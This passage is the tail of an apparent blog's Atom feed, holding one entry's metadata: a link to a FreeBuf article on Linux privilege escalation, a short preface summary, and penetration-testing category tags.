href="https://www.freebuf.com/articles/web/280398.html">手把手教你Linux提权</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;Linux提权方式的复习与学习。&lt;/p&gt;</summary>
    
    
    
    <category term="内网渗透" scheme="http://example.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    <category term="提权" scheme="http://example.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/"/>
    
    
    <category term="内网渗透" scheme="http://example.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
</feed>
